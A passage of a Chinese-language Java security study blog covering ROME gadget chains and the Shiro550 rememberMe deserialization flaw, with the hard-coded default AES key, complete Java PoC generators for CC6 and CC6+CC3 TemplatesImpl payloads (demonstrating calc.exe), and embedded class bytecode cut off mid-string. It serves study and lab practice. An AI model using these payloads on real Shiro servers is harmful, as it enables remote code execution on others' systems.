class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure></li></ol><h3 id="BadAttributeValueExpException-readObject"><a href="#BadAttributeValueExpException-readObject" class="headerlink" title="BadAttributeValueExpException.readObject()"></a>BadAttributeValueExpException.readObject()</h3><ol><li><p>source和sink</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="EqualsBean利用链"><a href="#EqualsBean利用链" class="headerlink" title="EqualsBean利用链"></a>EqualsBean利用链</h2><h3 id="EqualsBean-Gadget"><a href="#EqualsBean-Gadget" class="headerlink" title="EqualsBean Gadget"></a>EqualsBean Gadget</h3><ol><li>依旧是一条”原生链”(除了rome外)</li><li>这里依旧忽略poc，裁缝一下就ok了</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">HashMap.put()</span><br><span class="line">HashMap.putVal()</span><br><span class="line">AbstractMap.equals()</span><br><span class="line">EqualsBean.equals()</span><br><span class="line">EqualsBean.beanEquals()</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>ysoserial源码</li><li>信工所大佬</li><li><a href="https://xz.aliyun.com/t/13286?time__1311=GqmxuD0DnD9D2DUx05bK=ePAIhkGCWfCeD">比较全</a><ol><li>其中还有两个利用方法(第7和第8)之前没有学过的，有空再来看看</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(13)_shiro550</title>
      <link href="/2024/11/23/Java%E5%AE%89%E5%85%A85(13)_shiro550/"/>
      <url>/2024/11/23/Java%E5%AE%89%E5%85%A85(13)_shiro550/</url>
      
        <content type="html"><![CDATA[<h2 id="Shiro550引入与条件"><a href="#Shiro550引入与条件" class="headerlink" title="Shiro550引入与条件"></a>Shiro550引入与条件</h2><blockquote><p>利用版本 Apache Shiro &lt;&#x3D; 1.2.4<br>密钥安置再org.apache.shiro.mgt.AbstractRememberMeManager: kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;<br>CC和CB的版本具体情况分析</p></blockquote><ol><li><strong>漏洞原理</strong>：此漏洞存在于 Shiro 的 rememberMe 功能中，该功能允许用户保持登录状态。当用户请求带有 rememberMe 标志的登录时，Shiro 会生成一个包含用户凭证的 cookie。这个 cookie 使用 AES-128-CBC 模式加密，<strong>并且密钥是硬编码的</strong>。攻击者可以通过使用已知的默认密钥构造恶意序列化对象，对 cookie 进行编码，然后将其发送给服务器。服务器在解码和反序列化过程中，如果未对输入数据进行严格的校验，就可能导致远程代码执行。</li><li><strong>利用方法</strong>：通常涉及使用工具如 ysoserial 生成恶意的序列化对象，然后通过修改 rememberMe cookie 来触发漏洞。</li></ol><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote><p>又是讨厌配环境的一天呜呜，半下午没有出来，晚上秒了wc</p></blockquote><ol><li><p>版本信息</p><ol><li><a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">shiro源码下载链接</a></li><li>具体流程见Ref环境搭建1.</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Java: <span class="number">1.8</span><span class="number">.0_066</span></span><br><span class="line">Tomcat: <span class="number">8.5</span><span class="number">.76</span></span><br><span class="line">shiro: <span class="number">1.2</span><span class="number">.4</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="CC3-2-1’s-Shiro550"><a href="#CC3-2-1’s-Shiro550" class="headerlink" title="CC3.2.1’s Shiro550"></a>CC3.2.1’s Shiro550</h2><h3 id="导入CC依赖"><a href="#导入CC依赖" class="headerlink" title="导入CC依赖"></a>导入CC依赖</h3><ol><li><p>导入commons-collections3.2.1的依赖到sample&#x2F;web的pom.xml里再reload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="rememberMe"><a href="#rememberMe" class="headerlink" title="rememberMe"></a>rememberMe</h3><ol><li>burp抓包，这里需要设置，只需要用成ipv4就可以了</li><li>抓包查看，注意到开启rememberMe时<ol><li>为了让浏览器或服务器重启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。</li></ol></li><li>攻击流程<ol><li>由于此处有依赖CC3.2.1，使用以前学过的CC利用链生成一个序列化Payload</li><li>使用Shiro默认Key进行加密</li><li>将密文作为rememberMe的Cookie发送给服务端</li></ol></li></ol><h3 id="Q-为什么CC6行不通"><a href="#Q-为什么CC6行不通" class="headerlink" title="Q: 为什么CC6行不通?"></a>Q: 为什么CC6行不通?</h3><ol><li><p>再cc6基础上进行改造有一下poc</p><ol><li>打不通，会有报错<img src="/pic/Java%E5%AE%89%E5%85%A85(13)_shiro550/CC6_shiro550.png" alt="CC6_shiro550"><img src="/pic/Java%E5%AE%89%E5%85%A85(13)_shiro550/CC6_shiro550_2.png" alt="CC6_shiro550_2"><ol><li>有报错信息<code>org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system/application ClassLoader</code></li></ol></li><li><em><strong>这里只说结论，具体原因与调试见下Ref</strong></em>: shiro的反序列化利用中，如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误；补充一下Shiro不是遇到Tomcat就一定会有数组这个问题</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro550;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span></span><br><span class="line">                    <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                            String.class,</span><br><span class="line">                            Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                            Object.class,</span><br><span class="line">                            Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                            <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class</span><br><span class="line">                    &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                    <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">            outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span></span><br><span class="line">                    ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ==================</span></span><br><span class="line">            <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">            oos.writeObject(expMap);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// shiro550的处理</span></span><br><span class="line">            <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">            <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">            <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(),key);</span><br><span class="line">            System.out.println(ciphertext.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="无数组？CC6"><a href="#无数组？CC6" class="headerlink" title="无数组？CC6"></a>无数组？CC6</h3><ol><li><p>那么就要改进了，<strong>不要数组</strong>，直接通过某个对象调用方法，想到了TemplatesImpl，可以任意defineClass()，只需要有触发</p></li><li><p>注意到CC3中</p><ol><li>来到LazyMap.get()这一步，只要直接传入时ConstantTransformer的transform()的返回值就好了，这里使用TemplatesImpl，因为Runtime无法直接传只能反射必须有ConstantTransformer</li><li>之后直接调用InvokeTransformer的tranform触发我们想要的TemplatesImpl触发点</li><li><strong>总的来说就是把key变成TemplatesImpl对象，把factory变成调用方法的Transformer</strong>，这里是直接对cc6进行改造</li></ol></li><li><p><strong>这里不用TransformedMap的版本</strong></p><ol><li>因为其中的iTranformer属性是一个数组，要求是数组类型的，非数组无法进行赋值，这里反射无法绕过</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CC6 gadget chain</span></span><br><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">   java.util.HashMap.readObject()</span><br><span class="line">       java.util.HashMap.hash()</span><br><span class="line">           org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">           org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">               org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                   org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                       org.apacheecommons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                           java.lang.reflect.Method.invoke()</span><br><span class="line">                           java.lang.Runtime.exec()   </span><br><span class="line"></span><br><span class="line"><span class="comment">// LazyMap.java</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">     <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">     <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">         <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">         map.put(key, value);</span><br><span class="line">         <span class="keyword">return</span> value;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="new-Gadget-CC6-CC3"><a href="#new-Gadget-CC6-CC3" class="headerlink" title="new Gadget: CC6 + CC3"></a>new Gadget: CC6 + CC3</h3><ol><li><p>先贴一贴bro</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line"> java.util.HashMap.readObject()</span><br><span class="line">     java.util.HashMap.hash()</span><br><span class="line">         org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">         org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">             org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">               <span class="comment">//   org.apache.commons.collections.functors.ChainedTransformeretransform() 少了这一步，直接调用</span></span><br><span class="line">               TemplatesImpl#newTransformer()</span><br><span class="line">                  TemplatesImpl#getTransletInstance()</span><br><span class="line">                      TemplatesImpl#defineTransletClasses()</span><br><span class="line">                          TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></li></ol><h3 id="CC3-2-1-shiro550-poc"><a href="#CC3-2-1-shiro550-poc" class="headerlink" title="CC3.2.1 + shiro550 poc"></a>CC3.2.1 + shiro550 poc</h3><ol><li>放到rememberMe中后可以进行触发<ol><li>java反序列化链最好也本地先试一试</li><li>原理: <strong>总的来说就是把key变成TemplatesImpl对象，把factory变成调用方法的Transformer</strong></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro550;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">withCC_shiro550</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;Base64.decode(</span><br><span class="line">                    <span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span> +</span><br><span class="line">                            <span 